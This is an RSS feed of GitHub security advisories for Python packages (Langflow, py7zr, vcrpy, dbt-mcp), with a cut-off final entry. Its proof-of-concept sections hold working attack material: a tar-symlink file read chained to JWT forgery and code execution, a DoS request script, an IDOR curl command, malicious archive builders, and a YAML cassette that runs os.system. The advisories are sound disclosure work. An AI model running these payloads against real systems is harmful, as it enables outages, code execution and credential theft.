<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/pip.rss</id>
    <title>Security Advisory for Python packages hosted at PyPI.org</title>
    <updated>2026-06-19T21:22:36.663Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
    <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[langflow] Langflow: BaseFileComponent-based nodes arbitrary file read with RCE exploit]]></title>
        <id>https://github.com/advisories/GHSA-ccv6-r384-xp75</id>
        <link href="https://github.com/advisories/GHSA-ccv6-r384-xp75"/>
        <updated>2026-06-19T21:18:27.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>All components based on <code>BaseFileComponent</code> are vulnerable to the following vulnerability:</p>
<ol>
<li>Docling (<code>DoclingInlineComponent</code>)</li>
<li>Docling Serve (<code>DoclingRemoteComponent</code>)</li>
<li>Read File (<code>FileComponent</code>)</li>
<li>NVIDIA Retriever Extraction (<code>NvidiaIngestComponent</code>)</li>
<li>Video File (<code>VideoFileComponent</code>)</li>
<li>Unstructured API (<code>UnstructuredComponent</code>)</li>
</ol>
<p>For clarity, from now on I'll only refer to Read File component.</p>
<p>The Read File node processes user-controlled files.
Example scenario is a RAG chatbot - a system that allows users of an organization to ask questions about documents saved in the organizations.</p>
<p>By controlling a files that are digested into the RAG, an attacker can direct the node to read <em>any</em> file on the file-system by absolute path.</p>
<p>Using this vulnerability an attacker can acheive RCE:</p>
<ol>
<li>Upload a file that directs the node to read Langflow's <code>secret_key</code> file containing the JWT token secret.</li>
<li>This would allow the attacker then to simply task the Chatbot for the JWT secret.</li>
<li>Using this secret, the attacker then crafts a JWT token for any user-id, bypassing authentication.</li>
<li>Code execution is then trivial - simply create a new flow with "Python Interpreter" node, fill it with arbitrary Python code and execute it.</li>
</ol>
<p>Tested on commit 2d67402b1dbaefcbce85a244d4a6cd5e4bda1cfe</p>
<h3 id="details">Details</h3>
<p>The vulnerability is in:
<code>langflow/src/lfx/src/lfx/base/data/base_file.py</code>
Specifically in <code>_unpack_bundle</code>. This function extracts tar files, which can contain a symlink.
This symlink can point to any file in the filesystem. Then, in <code>self.process_files()</code>, the file pointed by the symlink will be parsed and saved into the RAG.
This can be done with unlimited number of symlinks in the same tar which can also be useful in some scenarios.</p>
<p>Suggestd fix - iterate over the files and make sure all are regular files or directories.</p>
<h3 id="poc">PoC</h3>
<p>Reproduction:</p>
<ol>
<li>Create a flow with Read File (or any other affected components), and connect its output to some storage such as Chroma DB.</li>
<li>Create a symlink pointing to any file. For the above exploit, point the symlink to langflow's JWT token file.</li>
<li>Compress this symlink with tar.</li>
<li>Upload it to the Read File component.</li>
<li>Check the database, or ask a Chatbot connected to this vector database for the contents of the file.</li>
</ol>
<h2 id="concrete-poc">Concrete PoC:</h2>
<ul>
<li>Flow with RAG ingestion and a Chatbot around it: <a href="https://github.com/user-attachments/files/25159960/Vector.Store.RAG.json">Vector Store RAG.json</a></li>
<li>Exploit tar: <a href="https://github.com/user-attachments/files/25159954/archive.tar.txt">archive.tar.txt</a> (remove .txt, GitHub blocked .tar)</li>
<li>Create a file <code>/tmp/trip.docx</code> with any contents in it</li>
<li>Ingest the file in the flow above, and ask the Chatbot a question about this file.</li>
</ul>
<p>A demo showing the attack:
<a href="https://github.com/user-attachments/assets/af00f700-f13f-4eac-848e-8afd11fb9297">https://github.com/user-attachments/assets/af00f700-f13f-4eac-848e-8afd11fb9297</a>
In the demo the attacker steals <code>Langflow</code> secret key used to sign JWTs. The second stage of the attack, not shown in the demo, is using this key to sign a JWT token and executing Python code on the server using the Python code interpreter node.</p>
<h3 id="impact">Impact</h3>
<p>Any Langflow user using any of the above mentioned components to ingest user-controlled data is affected. Depending on exact scenario, the user can also be exposed to an RCE risk.</p>
<h3 id="patches">Patches</h3>
<p>Fixed in <strong>1.9.2</strong> via PR <a href="https://github.com/langflow-ai/langflow/pull/12945">#12945</a>. <code>BaseFileComponent._unpack_bundle</code> now rejects symlink and hardlink members (and any non-regular entries) during TAR extraction, with additional defensive symlink filtering during directory recursion and after extraction. Upgrade to <strong>1.9.2 or later</strong>.</p>
<p>Ori Lahav
Security Researcher @ Rubrik Inc.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/langflow-ai/langflow/security/advisories/GHSA-ccv6-r384-xp75">https://github.com/langflow-ai/langflow/security/advisories/GHSA-ccv6-r384-xp75</a></li>
<li><a href="https://github.com/langflow-ai/langflow/pull/12945">https://github.com/langflow-ai/langflow/pull/12945</a></li>
<li><a href="https://github.com/advisories/GHSA-ccv6-r384-xp75">https://github.com/advisories/GHSA-ccv6-r384-xp75</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-ccv6-r384-xp75</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-06-19T21:18:24.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[langflow] Langflow: Unauthenticated DoS through multipart form boundary file upload]]></title>
        <id>https://github.com/advisories/GHSA-qwqc-p3q8-wcg9</id>
        <link href="https://github.com/advisories/GHSA-qwqc-p3q8-wcg9"/>
        <updated>2026-06-19T21:17:38.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>An attacker can send a <code>/api/v1/files/upload/</code> request without any authentication token/cookies and abuse a very long multipart form boundary to make the langflow app unusable for all users for an indefinite amount of time. </p>
<h3 id="details">Details</h3>
<p><a href="https://github.com/langflow-ai/langflow/blob/v1.0.18/src/backend/base/langflow/api/v1/files.py#L40">https://github.com/langflow-ai/langflow/blob/v1.0.18/src/backend/base/langflow/api/v1/files.py#L40</a></p>
<p>The file upload function will try to process the multipart form data even if it is malformed and contains a payload such as an extremely large amount of hyphens after the boundary. It also does not do the authentication check before trying to process this data so an unauthenticated attacker can perform this as well as authenticated users. </p>
<p>Additionally, an attacker doesn't even need to know a valid UUID of a flow to send this request because the server will still try to process the large boundary even with any random value in place of the flow ID. </p>
<h3 id="poc">PoC</h3>
<p>An attacker makes this request to upload a file without valid authentication information or a valid flow ID: </p>
<pre><code>POST /api/v1/files/upload/test HTTP/1.1
Host: 127.0.0.1:7860
Content-Length: 3000192
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryorGBAKSkv5wR6WqJ
Accept: application/json, text/plain, */*
Origin: http://127.0.0.1:7860
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

------WebKitFormBoundaryorGBAKSkv5wR6WqJ
Content-Disposition: form-data; name="file"; filename="dos.txt"
Content-Type: text/plain

DoS in progress!

------WebKitFormBoundaryorGBAKSkv5wR6WqJ------------&lt;insert a large amount of hyphens such as 1,000,000&gt;
</code></pre>
<p>Here is the request in python: </p>
<pre><code class="language-python">import requests

url = "http://127.0.0.1:7860/api/v1/files/upload/test"

headers = {
    "Content-Type": "multipart/form-data; boundary=---------------------------WebKitFormBoundaryorGBAKSkv5wR6WqJ"
}

data = (
    "-----------------------------WebKitFormBoundaryorGBAKSkv5wR6WqJ\r\n"
    "Content-Disposition: form-data; name=\"file\"; filename=\"dos.txt\"\r\n"
    "Content-Type: text/plain\r\n\r\n"
    "DoS in progress\r\n"
    "-----------------------------WebKitFormBoundaryorGBAKSkv5wR6WqJ--" + '-' * 1000000 + "\r\n"
)

response = requests.post(url, headers=headers, data=data)
</code></pre>
<p>The app will then be stuck in the "server is busy" state for all users:</p>
<img width="733" alt="image" src="https://github.com/user-attachments/assets/227169d8-f1b7-4072-8c09-e416e4808d05">

<h3 id="impact">Impact</h3>
<p>Sending this request will result in the server being unusable for all users for an infinite amount of time because the request can be repeated as much as you want.</p>
<h3 id="patches">Patches</h3>
<p>Fixed in <strong>1.0.19</strong> via PR <a href="https://github.com/langflow-ai/langflow/pull/3923">#3923</a>. A <code>check_boundary</code> HTTP middleware was added that validates the multipart boundary (<code>^[\w\-]{1,70}$</code>) and rejects malformed requests — including the oversized-hyphen payload — with <code>HTTP 422</code> <strong>before</strong> the body is parsed. The upload endpoint also gained an authentication and flow-ownership check (<code>get_current_active_user</code> + <code>403</code> on mismatch), closing the unauthenticated access vector. Upgrade to <strong>1.0.19 or later</strong>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/langflow-ai/langflow/security/advisories/GHSA-qwqc-p3q8-wcg9">https://github.com/langflow-ai/langflow/security/advisories/GHSA-qwqc-p3q8-wcg9</a></li>
<li><a href="https://github.com/langflow-ai/langflow/pull/3923">https://github.com/langflow-ai/langflow/pull/3923</a></li>
<li><a href="https://github.com/langflow-ai/langflow/blob/v1.0.18/src/backend/base/langflow/api/v1/files.py#L40">https://github.com/langflow-ai/langflow/blob/v1.0.18/src/backend/base/langflow/api/v1/files.py#L40</a></li>
<li><a href="https://github.com/advisories/GHSA-qwqc-p3q8-wcg9">https://github.com/advisories/GHSA-qwqc-p3q8-wcg9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qwqc-p3q8-wcg9</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-19T21:17:37.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[langflow] Langflow: Logout button does not clear session]]></title>
        <id>https://github.com/advisories/GHSA-7hw8-6q6r-4276</id>
        <link href="https://github.com/advisories/GHSA-7hw8-6q6r-4276"/>
        <updated>2026-06-19T21:17:02.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The logout button does not clear the session. The previous user stays logged in unless another user explicitly logs in.</p>
<h3 id="details">Details</h3>
<p>Not in auto login mode. Hosted on localhost. <code>access_token_lf</code> remains present in both Local Storage and Cookies. <code>refresh_token_lf</code> remains present in Cookies.</p>
<p><strong>Root cause:</strong> the <code>/logout</code> endpoint deleted the authentication cookies without matching the original <code>httponly</code>/<code>samesite</code>/<code>secure</code>/<code>domain</code> parameters, so the browser kept them; additionally the frontend did not clear the auth cookies on logout.</p>
<pre><code>LANGFLOW_AUTO_LOGIN: "False"
LANGFLOW_SUPERUSER: &lt;set&gt;
LANGFLOW_SUPERUSER_PASSWORD: &lt;set&gt;
LANGFLOW_SECRET_KEY: &lt;set&gt;
LANGFLOW_NEW_USER_IS_ACTIVE: "False"
LANGFLOW_ENABLE_SUPERUSER_CLI: "False"
</code></pre>
<h3 id="poc">PoC</h3>
<p>Click Logout. Hit refresh to return to previous screen.</p>
<h3 id="impact">Impact</h3>
<p>Users on shared computers may falsely believe they have terminated their session.</p>
<h3 id="patches">Patches</h3>
<p>Fixed in <strong>1.7.0</strong> (PRs #10527 and #10528). The logout endpoint now deletes the auth cookies using the same parameters they were created with, and the frontend clears the auth cookies on logout. Upgrade to <strong>1.7.0 or later</strong>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/langflow-ai/langflow/security/advisories/GHSA-7hw8-6q6r-4276">https://github.com/langflow-ai/langflow/security/advisories/GHSA-7hw8-6q6r-4276</a></li>
<li><a href="https://github.com/langflow-ai/langflow/pull/10527">https://github.com/langflow-ai/langflow/pull/10527</a></li>
<li><a href="https://github.com/langflow-ai/langflow/pull/10528">https://github.com/langflow-ai/langflow/pull/10528</a></li>
<li><a href="https://github.com/advisories/GHSA-7hw8-6q6r-4276">https://github.com/advisories/GHSA-7hw8-6q6r-4276</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7hw8-6q6r-4276</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-19T21:17:01.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[langflow] Langflow: IDOR Vulnerability in `/api/v1/responses` Endpoint Allows Authenticated Attackers to Access Another User's Flow]]></title>
        <id>https://github.com/advisories/GHSA-qrpv-q767-xqq2</id>
        <link href="https://github.com/advisories/GHSA-qrpv-q767-xqq2"/>
        <updated>2026-06-19T21:16:47.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>Insecure Direct Object Reference (IDOR) vulnerability in <code>/api/v1/responses</code> endpoint allows an authenticated attacker to execute any flow belonging to another user by specifying the victim's flow ID in the request.</p>
<h2 id="details">Details</h2>
<p>The vulnerability exists in the <code>get_flow_by_id_or_endpoint_name</code> helper function in <a href="https://github.com/langflow-ai/langflow/blob/v1.9.0/src/backend/base/langflow/helpers/flow.py#L399C1-L414C67"><code>src/backend/base/langflow/helpers/flow.py</code> (lines 399-414)</a>.</p>
<p>When a flow is accessed via UUID (flow_id), the function queries the database directly without verifying if the authenticated user owns that flow:</p>
<pre><code class="language-python"># src/backend/base/langflow/helpers/flow.py:399-414
async def get_flow_by_id_or_endpoint_name(flow_id_or_name: str, user_id: str | UUID | None = None) -&gt; FlowRead:
    async with session_scope() as session:
        try:
            flow_id = UUID(flow_id_or_name)
            # When using UUID, query directly WITHOUT checking user_id
            flow = await session.get(Flow, flow_id)  # ❌ No user_id check!
        except ValueError:
            endpoint_name = flow_id_or_name
            stmt = select(Flow).where(Flow.endpoint_name == endpoint_name)
            # Only when using endpoint_name is user_id checked
            if user_id:
                stmt = stmt.where(Flow.user_id == uuid_user_id)
</code></pre>
<p>This function is used by the <code>/api/v1/responses</code> endpoint (defined in <a href="https://github.com/langflow-ai/langflow/blob/v1.9.0/src/backend/base/langflow/api/v1/openai_responses.py#L589"><code>src/backend/base/langflow/api/v1/openai_responses.py:589</code></a>).</p>
<h2 id="poc-proof-of-concept">PoC (Proof of Concept)</h2>
<pre><code class="language-bash"># Attacker (user A) with API_KEY_A tries to execute victim (user B)'s flow
curl -X POST "http://localhost:7860/api/v1/responses" \
  -H "x-api-key: sk-ATTACKER_API_KEY" \
  -H "Content-Type: application/json" \
  -d '{
    "model": "VICTIM_FLOW_ID",
    "input_value": "test",
    "stream": false
  }'
# Returns 200 and executes the victim's flow
</code></pre>
<h2 id="impact">Impact</h2>
<p>Any authenticated user can:</p>
<ol>
<li>Execute any flow in the system by knowing its flow ID</li>
<li>Access potentially sensitive data processed by victim's flows</li>
<li>Consume victim's resources</li>
</ol>
<h2 id="fixes">Fixes</h2>
<p>Fixed in <strong>PR #12832</strong> (<code>fix(security): close IDOR in get_flow_by_id_or_endpoint_name</code>), merged 2026-04-22, released in <strong>Langflow 1.9.1</strong>.</p>
<p>The helper normalizes <code>user_id</code> once and enforces ownership on <strong>both</strong> lookup branches (UUID <em>and</em> <code>endpoint_name</code>):</p>
<pre><code class="language-python">flow_id = UUID(flow_id_or_name)
flow = await session.get(Flow, flow_id)
if flow is not None and uuid_user_id is not None and flow.user_id != uuid_user_id:
    flow = None  # cross-user lookup falls through to the shared 404
</code></pre>
<p>Key points:</p>
<ul>
<li>Cross-user lookups return <strong>404</strong> (not 403), so flow existence is not disclosed via a 403-vs-404 oracle.</li>
<li><code>/api/v1/responses</code> and <code>/api/v2/workflow</code> pass <code>user_id</code> explicitly, so fixing the helper closes them directly; the <code>/api/v1/run*</code> routes were additionally moved from a bare <code>Depends(get_flow_by_id_or_endpoint_name)</code> to auth-aware wrapper dependencies (defense in depth).</li>
<li>A malformed <code>user_id</code> now fails closed (404 instead of a raw 500).</li>
<li>Webhook routes intentionally keep the unscoped lookup (public by design / explicit ownership check elsewhere).</li>
<li>Regression tests cover the cross-user UUID case and reproduce the original PoC against <code>/api/v1/responses</code>.</li>
</ul>
<h2 id="acknowledgements">Acknowledgements</h2>
<p>Thanks to the security researchers who responsibly disclosed this vulnerability:</p>
<ul>
<li>@yzeirnials</li>
<li>@johnatzeropath</li>
<li>@LeftenantZero</li>
<li>@Zwique</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/langflow-ai/langflow/security/advisories/GHSA-qrpv-q767-xqq2">https://github.com/langflow-ai/langflow/security/advisories/GHSA-qrpv-q767-xqq2</a></li>
<li><a href="https://github.com/langflow-ai/langflow/pull/12832">https://github.com/langflow-ai/langflow/pull/12832</a></li>
<li><a href="https://github.com/advisories/GHSA-qrpv-q767-xqq2">https://github.com/advisories/GHSA-qrpv-q767-xqq2</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qrpv-q767-xqq2</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-06-19T21:16:46.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[py7zr] py7zr: O(n^2) algorithmic complexity DoS in PackInfo._read()]]></title>
        <id>https://github.com/advisories/GHSA-h4gh-22qq-72r7</id>
        <link href="https://github.com/advisories/GHSA-h4gh-22qq-72r7"/>
        <updated>2026-06-19T21:16:36.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>PackInfo._read() uses an O(n^2) cumulative sum pattern where
  numstreams is read directly from the archive header. A crafted .7z
  archive with a large numstreams value causes excessive CPU consumption
   during SevenZipFile.<strong>init</strong>() — no extraction is needed. A 50 KB
  archive takes ~7 seconds of CPU time.</p>
<h3 id="details">Details</h3>
<p>  The vulnerable code is in PackInfo._read() (archiveinfo.py):</p>
<p>  self.packpositions = [sum(self.packsizes[:i]) for i in
  range(self.numstreams + 1)]</p>
<p>  numstreams is parsed from the archive header via read_uint64() and is
  attacker-controlled. Each sum(self.packsizes[:i]) re-sums from the
  beginning, producing O(n^2) total work. This runs during header
  parsing in SevenZipFile.<strong>init</strong>(), before any extraction.</p>
<p>  Suggested fix — replace with O(n) cumulative sum:</p>
<p>  from itertools import accumulate
  self.packpositions = [0] + list(accumulate(self.packsizes))</p>
<h3 id="poc">PoC</h3>
<pre><code class="language-import">  import py7zr
  from py7zr.archiveinfo import write_uint64, PROPERTY

  MAGIC = b'\x37\x7a\xbc\xaf\x27\x1c'

  def encode_uint64(v):
      buf = io.BytesIO()
      write_uint64(buf, v)
      return buf.getvalue()

  def build_7z_with_streams(numstreams):
      header = io.BytesIO()
      header.write(PROPERTY.HEADER)
      header.write(PROPERTY.MAIN_STREAMS_INFO)
      header.write(PROPERTY.PACK_INFO)
      header.write(encode_uint64(0))
      header.write(encode_uint64(numstreams))
      header.write(PROPERTY.SIZE)
      for _ in range(numstreams):
          header.write(encode_uint64(1))
      header.write(PROPERTY.END)
      header.write(PROPERTY.END)
      header.write(PROPERTY.END)
      header_data = header.getvalue()

      out = io.BytesIO()
      out.write(MAGIC)
      out.write(b'\x00\x04')
      next_crc = binascii.crc32(header_data) &amp; 0xFFFFFFFF
      start_header = (struct.pack('&lt;Q', 0)
                      + struct.pack('&lt;Q', len(header_data))
                      + struct.pack('&lt;I', next_crc))
      out.write(struct.pack('&lt;I', binascii.crc32(start_header) &amp;
  0xFFFFFFFF))
      out.write(start_header)
      out.write(header_data)
      return out.getvalue()

  for n in [1000, 5000, 10000, 30000, 50000]:
      archive = build_7z_with_streams(n)
      start = time.time()
      try:
          with py7zr.SevenZipFile(io.BytesIO(archive), 'r') as z:
              pass
      except Exception:
          # The crafted archive may later raise due to being malformed,
          # but the quadratic work has already been performed during
          # header parsing in SevenZipFile.__init__().
          pass
      elapsed = time.time() - start
      print(f"n={n:6d}  size={len(archive):8d} bytes
  time={elapsed:.3f}s")
</code></pre>
<p>  Tested on py7zr 1.1.0, Python 3.12.3, Linux x86_64.</p>
<p>  Results:</p>
<p>  n=  1000  size=    1042 bytes  time=0.004s
  n=  5000  size=    5042 bytes  time=0.071s
  n= 10000  size=   10042 bytes  time=0.291s
  n= 30000  size=   30043 bytes  time=2.609s
  n= 50000  size=   50043 bytes  time=7.097s</p>
<h3 id="impact">Impact</h3>
<p>Denial of Service. Any application that opens .7z archives from
  untrusted sources using py7zr.SevenZipFile() can be caused to consume
  excessive CPU time with a small crafted archive. The quadratic cost
  occurs during header parsing, before any content extraction.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/miurahr/py7zr/security/advisories/GHSA-h4gh-22qq-72r7">https://github.com/miurahr/py7zr/security/advisories/GHSA-h4gh-22qq-72r7</a></li>
<li><a href="https://github.com/miurahr/py7zr/releases/tag/v1.1.3">https://github.com/miurahr/py7zr/releases/tag/v1.1.3</a></li>
<li><a href="https://github.com/advisories/GHSA-h4gh-22qq-72r7">https://github.com/advisories/GHSA-h4gh-22qq-72r7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-h4gh-22qq-72r7</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-19T21:16:33.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[py7zr] py7zr: Decompression bomb (zip bomb) denial of service via unchecked extraction size]]></title>
        <id>https://github.com/advisories/GHSA-gjrg-mpp7-g774</id>
        <link href="https://github.com/advisories/GHSA-gjrg-mpp7-g774"/>
        <updated>2026-06-19T21:16:31.000Z</updated>
        <content type="html"><![CDATA[<p>py7zr's <code>Worker.decompress()</code> extracts archive entries without tracking total decompressed size. A crafted <code>.7z</code> file can exhaust disk or memory before the extraction completes.</p>
<p>Measured: 15.6 KB archive → 100 MB output (6,556:1 ratio).</p>
<p><strong>Proof of concept:</strong></p>
<pre><code class="language-python">import py7zr, tempfile, os

# create bomb: compress 100MB of zeros into ~15KB
bomb_path = tempfile.mktemp(suffix='.7z')
with py7zr.SevenZipFile(bomb_path, 'w') as z:
    import io
    z.writef(io.BytesIO(b'\x00' * 100 * 1024 * 1024), 'bomb.bin')

print(f'archive size: {os.path.getsize(bomb_path):,} bytes')

# extract — no size check
with py7zr.SevenZipFile(bomb_path, 'r') as z:
    z.extractall(path=tempfile.mkdtemp())

print('extracted 100 MB from ~15 KB archive')
</code></pre>
<p><strong>Root cause:</strong> <code>Worker.decompress()</code> in <code>py7zr/worker.py</code> writes decompressed data directly to disk without a running total or configurable size limit. There is no equivalent of Python's <code>zipfile</code> <code>max_size</code> parameter.</p>
<p><strong>Fix:</strong> track cumulative decompressed bytes and raise before writing if a limit is exceeded:</p>
<pre><code class="language-python">MAX_EXTRACT_SIZE = 2 * 1024 ** 3  # 2 GB default, configurable

total = 0
for chunk in decompressed_chunks:
    total += len(chunk)
    if total &gt; MAX_EXTRACT_SIZE:
        raise py7zr.exceptions.DecompressionBombError(
            f'Extraction aborted: decompressed size exceeded {MAX_EXTRACT_SIZE} bytes'
        )
    outfile.write(chunk)
</code></pre>
<p>Tested on py7zr 0.22.0, Python 3.12, Ubuntu 22.04.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/miurahr/py7zr/security/advisories/GHSA-gjrg-mpp7-g774">https://github.com/miurahr/py7zr/security/advisories/GHSA-gjrg-mpp7-g774</a></li>
<li><a href="https://github.com/miurahr/py7zr/releases/tag/v1.1.3">https://github.com/miurahr/py7zr/releases/tag/v1.1.3</a></li>
<li><a href="https://github.com/advisories/GHSA-gjrg-mpp7-g774">https://github.com/advisories/GHSA-gjrg-mpp7-g774</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-gjrg-mpp7-g774</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-19T21:16:29.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vcrpy] VCR.py: Arbitrary code execution via unsafe YAML deserialization of cassette files]]></title>
        <id>https://github.com/advisories/GHSA-rpj2-4hq8-938g</id>
        <link href="https://github.com/advisories/GHSA-rpj2-4hq8-938g"/>
        <updated>2026-06-19T21:15:48.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>vcrpy deserializes YAML cassette files with PyYAML's object-constructing loader (<code>yaml.CLoader</code> / <code>yaml.Loader</code>) instead of the safe loader (<code>yaml.CSafeLoader</code> / <code>yaml.SafeLoader</code>). A cassette containing a <code>!!python/object/apply:</code> (or similar) tag therefore executes arbitrary Python code the moment the cassette is loaded — including through the normal <code>VCR().use_cassette()</code> path, before any HTTP interaction is replayed.</p>
<p>This is <strong>not</strong> limited to environments lacking the libYAML C extension. <code>CLoader</code> uses the C parser but PyYAML's full Python <em>constructor</em>, so Python
object tags execute under <code>CLoader</code> exactly as under the pure-Python <code>Loader</code>. Confirmed against vcrpy 8.1.1 + PyYAML 6.0.3 with <code>CLoader</code> active.</p>
<h3 id="affected-component">Affected component</h3>
<ul>
<li><code>vcr/serializers/yamlserializer.py</code> — <code>deserialize()</code> → <code>yaml.load(cassette_string, Loader=Loader)</code> where <code>Loader</code> is <code>CLoader</code>/<code>Loader</code>. Reached on <strong>every</strong> cassette load.</li>
<li><code>vcr/migration.py</code> (~line 107) — <code>yaml.load(preprocess_yaml(...), Loader=Loader)</code>. A second sink reached when the migration tool is run on a <code>.yaml</code> file. <code>preprocess_yaml()</code> only strips three known legacy tags, so other tags still execute.</li>
</ul>
<p>Present in all releases inspected, 1.0.0 through 8.1.1.</p>
<h3 id="proof-of-concept">Proof of concept</h3>
<pre><code class="language-python">import vcr, requests

# Attacker-supplied cassette. The payload sits in an ignored top-level key
# so the rest of the cassette stays valid; it fires during load.
open("evil.yaml", "w").write("""interactions:
- request:
    body: null
    headers: {Accept: ['*/*']}
    method: GET
    uri: http://example.com/
  response:
    body: {string: ok}
    headers: {Content-Type: ['text/plain']}
    status: {code: 200, message: OK}
_x: !!python/object/apply:os.system ['touch /tmp/VCRPY_YAML_RCE']
version: 1
""")

with vcr.use_cassette("evil.yaml"):      # &lt;-- /tmp/VCRPY_YAML_RCE created here
    requests.get("http://example.com/")
</code></pre>
<p>Loading the cassette creates <code>/tmp/VCRPY_YAML_RCE</code>, demonstrating arbitrary command execution. Any Python callable can be invoked this way.</p>
<h3 id="impact">Impact</h3>
<p>Arbitrary code execution in the process that loads the cassette, with that process's full privileges. Realistic delivery paths:</p>
<ul>
<li>A malicious cassette added in a pull request and loaded when CI runs the tests.</li>
<li>A poisoned shared test-fixture repository or cassette artifact store.</li>
<li>"Updated recorded HTTP fixtures" social-engineering.</li>
</ul>
<p>Because cassettes are typically loaded by test suites in CI/CD and on developer machines, the exposed secrets are exactly the high-value ones in those environments: CI deployment credentials, cloud IAM roles, registry/publishing tokens, and source access.</p>
<h3 id="patch">Patch</h3>
<p>Use the safe loader in <code>vcr/serializers/yamlserializer.py</code>:</p>
<pre><code class="language-python">try:
    from yaml import CDumper as Dumper
    from yaml import CSafeLoader as Loader
except ImportError:
    from yaml import Dumper
    from yaml import SafeLoader as Loader

def deserialize(cassette_string):
    return yaml.load(cassette_string, Loader=Loader)
</code></pre>
<p>Apply the same <code>SafeLoader</code> change in <code>vcr/migration.py</code>.</p>
<p>This is backwards compatible: vcrpy cassettes only contain standard YAML (scalars/lists/maps plus <code>!!binary</code>, all supported by <code>SafeLoader</code>/<code>CSafeLoader</code>), so existing cassettes load unchanged. vcrpy's <code>serialize.deserialize()</code> already catches <code>yaml.constructor.ConstructorError</code>, so a Python-tagged cassette now surfaces as the existing "old cassette format" <code>ValueError</code> instead of executing.</p>
<p>Recommended hardening: add a regression test that loads a cassette containing <code>!!python/object/apply:os.system</code> and asserts a <code>ConstructorError</code>/<code>ValueError</code> and that no side effect occurs.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/kevin1024/vcrpy/security/advisories/GHSA-rpj2-4hq8-938g">https://github.com/kevin1024/vcrpy/security/advisories/GHSA-rpj2-4hq8-938g</a></li>
<li><a href="https://github.com/advisories/GHSA-rpj2-4hq8-938g">https://github.com/advisories/GHSA-rpj2-4hq8-938g</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rpj2-4hq8-938g</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-19T21:15:47.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[dbt-mcp] dbt MCP Server: Unauthenticated OAuth Context Endpoint Leaks dbt Platform Tokens]]></title>
        <id>https://github.com/advisories/GHSA-jr33-mw75-7j8f</id>
        <link href="https://github.com/advisories/GHSA-jr33-mw75-7j8f"/>
        <updated>2026-06-19T21:15:41.000Z</updated>
        <content type="html"><![CDATA[<h2 id="unauthenticated-oauth-context-endpoint-leaks-dbt-platform-tokens">Unauthenticated OAuth Context Endpoint Leaks dbt Platform Tokens</h2>
<h3 id="summary">Summary</h3>
<p>The local OAuth helper FastAPI server bundled with <code>dbt-mcp</code> exposes the <code>GET /dbt_platform_context</code> endpoint without any form of authentication or host-origin validation. After a user completes the OAuth login flow against dbt Cloud (cloud.getdbt.com), the endpoint returns the full <code>DbtPlatformContext</code> object — including the victim's <code>access_token</code> and <code>refresh_token</code> for the dbt Platform API — verbatim to any caller that can reach <code>127.0.0.1:6785</code>. An attacker who can direct the victim's browser to the helper origin via DNS rebinding, or who has co-located process access on the same host, can silently exfiltrate both tokens. The stolen bearer token grants full dbt Cloud API access as the victim; the refresh token enables persistent access beyond the original token's expiry. <strong>CVSS Base Score: 8.0 (High).</strong></p>
<h3 id="details">Details</h3>
